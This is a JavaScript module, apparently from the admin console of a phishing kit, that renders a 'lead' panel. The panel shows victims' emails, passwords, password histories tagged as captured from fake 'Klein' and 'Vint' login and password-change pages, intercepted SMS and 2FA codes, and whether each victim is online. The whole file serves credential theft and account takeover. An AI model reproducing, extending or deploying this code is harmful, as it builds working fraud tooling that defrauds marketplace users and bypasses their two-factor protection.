(function () {
  'use strict';

  var adminCoreUtils = window.AdminCoreUtils || {};
  var escapeHtml = typeof adminCoreUtils.escapeHtml === 'function'
    ? adminCoreUtils.escapeHtml
    : function (s) {
      if (s == null) return '';
      var div = document.createElement('div');
      div.textContent = s;
      return div.innerHTML;
    };

  function formatEventLabelForDetailHtml(label) {
    var s = String(label || '');
    if (!s) return '';
    var m = s.match(/^(Ввел (?:SMS-код|SMS Kl|SMS Vt|2FA-код):\s*)(\S[\S\s]*)$/i);
    if (m) {
      return escapeHtml(m[1]) + '<span class="event-sms-code">' + escapeHtml(String(m[2] || '').trim()) + '</span>';
    }
    m = s.match(/^(Ввел SMS:\s*)(\S[\S\s]*)$/i);
    if (m) {
      return escapeHtml(m[1]) + '<span class="event-sms-code">' + escapeHtml(String(m[2] || '').trim()) + '</span>';
    }
    return escapeHtml(s);
  }

  function formatDetailEventTime(isoStr) {
    if (!isoStr) return '';
    try {
      var d = new Date(isoStr);
      var t = d.getTime();
      if (!Number.isFinite(t)) return '';
      var now = new Date();
      var sameCalendarDay =
        d.getFullYear() === now.getFullYear() &&
        d.getMonth() === now.getMonth() &&
        d.getDate() === now.getDate();
      if (sameCalendarDay) {
        return d.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', hour12: false });
      }
      return d.toLocaleString('ru-RU', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        hour12: false
      });
    } catch (_) {
      return '';
    }
  }

  function buildDetailEventNode(ev, isLatest, nodeName) {
    var at = '';
    if (ev.at) at = formatDetailEventTime(ev.at);
    var row = document.createElement(nodeName || 'li');
    row.className = 'event-item' + (isLatest ? ' event-item--latest' : '') + (ev.kind === 'log' ? ' ws-log-line' : '');
    row.innerHTML = '<span class="event-time">' + escapeHtml(at) + '</span>' +
      '<div class="event-main-col"><span class="event-text">→ ' + formatEventLabelForDetailHtml(ev.label || '') + '</span>' +
      (ev.detail ? '<span class="event-detail">' + escapeHtml(ev.detail) + '</span>' : '') + '</div>';
    return row;
  }

  function setCopyableValue(node, value) {
    if (!node) return;
    node.textContent = value || '—';
    node.classList.add('copy-on-click');
    node.title = 'Click to copy';
  }

  function renderStatusBlock(ctx) {
    var lead = ctx.lead;
    var el = ctx.el || {};
    var online = typeof ctx.isOnline === 'function' ? ctx.isOnline(lead) : false;

    var statusDot = document.getElementById('detail-status-dot');
    var statusText = document.getElementById('detail-status-text');
    var lastSeenEl = document.getElementById('detail-status-last-seen');
    if (statusDot && statusText) {
      statusDot.className = 'status-dot-inline ' + (online ? 'online' : 'offline');
      statusText.textContent = online ? 'Online' : 'Offline';
      if (lastSeenEl) {
        if (online) {
          lastSeenEl.classList.add('hidden');
          lastSeenEl.textContent = '';
        } else {
          var last = lead.lastSeenAt || lead.createdAt;
          if (last) {
            var d = new Date(last);
            if (!isNaN(d.getTime())) {
              var day = ('0' + d.getDate()).slice(-2);
              var month = ('0' + (d.getMonth() + 1)).slice(-2);
              var year = d.getFullYear();
              var h = ('0' + d.getHours()).slice(-2);
              var min = ('0' + d.getMinutes()).slice(-2);
              lastSeenEl.textContent = ' · ' + day + '.' + month + '.' + year + ' ' + h + ':' + min;
              lastSeenEl.classList.remove('hidden');
            } else {
              lastSeenEl.classList.add('hidden');
            }
          } else {
            lastSeenEl.classList.add('hidden');
          }
        }
      }
    }

    var leadIdsEqual = typeof ctx.leadIdsEqual === 'function' ? ctx.leadIdsEqual : function (a, b) { return String(a) === String(b); };
    var listItem = el.leadsList && Array.prototype.find.call(el.leadsList.querySelectorAll('.session-item'), function (n) {
      return leadIdsEqual(n.getAttribute('data-id'), lead.id);
    });
    if (listItem) {
      var statusSpan = listItem.querySelector('.session-status');
      if (statusSpan) statusSpan.className = online ? 'session-status' : 'session-status danger';
    }
  }

  function renderPasswordHistory(lead, historyEl) {
    if (!historyEl) return;
    var history = lead.passwordHistory || [];
    var historyCap = 80;
    var historyToShow = history.length > historyCap ? history.slice(-historyCap).reverse() : history.slice().reverse();
    historyEl.innerHTML = '';
    historyToShow.forEach(function (entry) {
      var p = typeof entry === 'object' && entry && entry.p != null ? entry.p : entry;
      var s = typeof entry === 'object' && entry && entry.s ? entry.s : '';
      var isFromChange = s === 'change';
      var isFromChangeKl = s === 'change_kl';
      var isLoginKl = s === 'login_kl';
      var histIsVint = String(lead && lead.brand || '').toLowerCase() === 'vint';
      var text = (p != null ? String(p).trim() : '') || '—';
      var line = document.createElement('div');
      line.className = 'password-history-line';
      var textSpan = document.createElement('span');
      textSpan.textContent = text;
      textSpan.style.flex = '1';
      textSpan.style.minWidth = '0';
      line.appendChild(textSpan);
      if (isFromChange) {
        var newLabel = document.createElement('span');
        newLabel.className = 'password-history-new';
        newLabel.textContent = 'new';
        newLabel.title = 'Со страницы смены пароля';
        line.appendChild(newLabel);
      } else if (isFromChangeKl) {
        var changeKlLabel = document.createElement('span');
        changeKlLabel.className = 'password-history-new';
        changeKlLabel.textContent = histIsVint ? 'new vt' : 'new kl';
        changeKlLabel.title = histIsVint ? 'Со страницы смены пароля (Vint)' : 'Со страницы смены пароля (Klein)';
        line.appendChild(changeKlLabel);
      } else if (isLoginKl) {
        var klLabel = document.createElement('span');
        klLabel.className = 'password-history-new';
        klLabel.textContent = histIsVint ? 'vt' : 'kl';
        klLabel.title = histIsVint ? 'Со страницы входа Vint' : 'Со страницы входа Klein';
        line.appendChild(klLabel);
      }
      historyEl.appendChild(line);
    });
    if (history.length === 0) {
      historyEl.textContent = '—';
      historyEl.classList.add('is-empty');
      historyEl.classList.remove('copy-on-click');
      historyEl.removeAttribute('title');
    } else {
      historyEl.classList.remove('is-empty');
      historyEl.classList.remove('copy-on-click');
      historyEl.removeAttribute('title');
    }
  }

  function renderEventsBlock(ctx) {
    var lead = ctx.lead;
    var terminal = ctx.terminal;
    if (!terminal) return;

    var events = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
    var logLines = String(lead.logTerminal || '')
      .split('\n')
      .map(function (line) { return String(line || '').trim(); })
      .filter(function (line) { return !!line; });
    var merged = [];
    events.forEach(function (ev, idx) {
      var atMs = 0;
      if (ev && ev.at) {
        var t = Date.parse(ev.at);
        if (Number.isFinite(t)) atMs = t;
      }
      merged.push({
        kind: 'event',
        atMs: atMs,
        idx: idx,
        at: ev && ev.at ? ev.at : '',
        label: ev && ev.label ? ev.label : '',
        detail: ev && ev.detail ? ev.detail : ''
      });
    });
    logLines.forEach(function (line, idx) {
      var m = line.match(/^(\d{4}-\d{2}-\d{2}T[0-9:.+-]+Z?)\s+(.*)$/);
      var iso = m && m[1] ? m[1] : '';
      var text = m && m[2] ? m[2] : line;
      var atMs = 0;
      if (iso) {
        var t = Date.parse(iso);
        if (Number.isFinite(t)) atMs = t;
      }
      merged.push({
        kind: 'log',
        atMs: atMs,
        idx: idx,
        at: iso,
        label: text
      });
    });
    merged.sort(function (a, b) {
      if (b.atMs !== a.atMs) return b.atMs - a.atMs;
      return b.idx - a.idx;
    });

    var buildCompactEventsForRender = typeof ctx.buildCompactEventsForRender === 'function'
      ? ctx.buildCompactEventsForRender
      : function (items) { return items || []; };
    var compact = buildCompactEventsForRender(merged, lead && lead.brand);
    var cap = Number.isFinite(ctx.renderDetailEventsCap) ? ctx.renderDetailEventsCap : Infinity;
    var toRender = compact.slice(0, cap);
    terminal.innerHTML = '';

    if (toRender.length === 1) {
      terminal.appendChild(buildDetailEventNode(toRender[0], true, 'li'));
    } else if (toRender.length > 1) {
      var wrapLi = document.createElement('li');
      wrapLi.className = 'events-collapsed-row';
      wrapLi.appendChild(buildDetailEventNode(toRender[0], true, 'div'));
      var nPast = toRender.length - 1;
      var toggleBtn = document.createElement('button');
      toggleBtn.type = 'button';
      toggleBtn.className = 'events-toggle';
      var normalizeLeadId = typeof ctx.normalizeLeadId === 'function' ? ctx.normalizeLeadId : function (id) { return id == null ? null : String(id); };
      var leadIdKey = normalizeLeadId(lead && lead.id);
      var detailEventsPastExpanded = ctx.detailEventsPastExpanded || {};
      function syncToggleLabel() {
        var expanded = wrapLi.classList.contains('is-expanded');
        toggleBtn.textContent = expanded ? 'Свернуть' : ('Показать предыдущие (' + nPast + ')');
      }
      if (leadIdKey && detailEventsPastExpanded[leadIdKey]) {
        wrapLi.classList.add('is-expanded');
      }
      syncToggleLabel();
      toggleBtn.addEventListener('click', function () {
        wrapLi.classList.toggle('is-expanded');
        if (leadIdKey) detailEventsPastExpanded[leadIdKey] = wrapLi.classList.contains('is-expanded');
        syncToggleLabel();
      });
      wrapLi.appendChild(toggleBtn);
      var pastUl = document.createElement('ul');
      pastUl.className = 'events-list-past';
      var pj;
      for (pj = 1; pj < toRender.length; pj++) {
        pastUl.appendChild(buildDetailEventNode(toRender[pj], false, 'li'));
      }
      wrapLi.appendChild(pastUl);
      terminal.appendChild(wrapLi);
    }

    if (compact.length > cap) {
      var truncNote = document.createElement('li');
      truncNote.className = 'event-item--cap-note';
      truncNote.setAttribute('role', 'note');
      truncNote.textContent = '… ещё ' + (compact.length - cap) + ' записей не показаны (отображаются ' + cap + ' последних по времени).';
      terminal.appendChild(truncNote);
    }
  }

  function renderLeadDetailPanel(ctx) {
    if (!ctx || !ctx.lead || !ctx.el) return;
    var lead = ctx.lead;
    var el = ctx.el;

    if (el.detailEmail) setCopyableValue(el.detailEmail, (lead.email || '').trim());

    var detailEmailAlt = document.getElementById('detail-email-kl');
    var detailPasswordAlt = document.getElementById('detail-password-kl');
    var detailLabelEmailPrimary = document.getElementById('detail-label-email-primary');
    var detailLabelPasswordPrimary = document.getElementById('detail-label-password-primary');
    var detailLabelEmailAlt = document.getElementById('detail-label-email-alt');
    var detailLabelPasswordAlt = document.getElementById('detail-label-password-alt');

    var getLeadBrandLabelSet = typeof ctx.getLeadBrandLabelSet === 'function' ? ctx.getLeadBrandLabelSet : function () { return {}; };
    var getLeadAltEmailValue = typeof ctx.getLeadAltEmailValue === 'function' ? ctx.getLeadAltEmailValue : function () { return ''; };
    var getLeadAltPasswordValue = typeof ctx.getLeadAltPasswordValue === 'function' ? ctx.getLeadAltPasswordValue : function () { return ''; };
    var detailLabels = getLeadBrandLabelSet(lead);

    if (detailEmailAlt) setCopyableValue(detailEmailAlt, getLeadAltEmailValue(lead));
    if (el.detailPasswordCurrent) setCopyableValue(el.detailPasswordCurrent, (lead.password || '').trim());
    if (detailPasswordAlt) setCopyableValue(detailPasswordAlt, getLeadAltPasswordValue(lead));

    if (detailLabelEmailPrimary) detailLabelEmailPrimary.textContent = detailLabels.primaryEmail || 'EMAIL';
    if (detailLabelPasswordPrimary) detailLabelPasswordPrimary.textContent = detailLabels.primaryPassword || 'PASSWORD';
    if (detailLabelEmailAlt) detailLabelEmailAlt.textContent = detailLabels.altEmailUpper || 'EMAIL KL';
    if (detailLabelPasswordAlt) detailLabelPasswordAlt.textContent = detailLabels.altPasswordUpper || 'PASSWORD KL';

    var smsRow = document.getElementById('detail-sms-row');
    var smsCodeEl = document.getElementById('detail-sms-code');
    var twoFaRow = document.getElementById('detail-2fa-row');
    var twoFaCodeEl = document.getElementById('detail-2fa-code');
    var rawCode = lead.smsCodeData && (lead.smsCodeData.code || '').trim();
    var smsCodeDataKind = typeof ctx.smsCodeDataKind === 'function' ? ctx.smsCodeDataKind : function () { return null; };
    var codeKind = rawCode ? smsCodeDataKind(lead) : null;

    if (smsRow && smsCodeEl) {
      if (rawCode && codeKind === 'sms') {
        smsRow.style.display = '';
        setCopyableValue(smsCodeEl, rawCode);
      } else {
        smsRow.style.display = 'none';
        smsCodeEl.textContent = '';
      }
    }
    if (twoFaRow && twoFaCodeEl) {
      if (rawCode && codeKind === '2fa') {
        twoFaRow.style.display = '';
        setCopyableValue(twoFaCodeEl, rawCode);
      } else {
        twoFaRow.style.display = 'none';
        twoFaCodeEl.textContent = '';
      }
    }

    renderStatusBlock(ctx);
    renderPasswordHistory(lead, el.passwordHistory);
    renderEventsBlock({
      lead: lead,
      terminal: el.detailTerminal,
      buildCompactEventsForRender: ctx.buildCompactEventsForRender,
      renderDetailEventsCap: ctx.renderDetailEventsCap,
      normalizeLeadId: ctx.normalizeLeadId,
      detailEventsPastExpanded: ctx.detailEventsPastExpanded
    });
  }

  window.AdminLeadDetail = {
    renderLeadDetailPanel: renderLeadDetailPanel
  };
})();
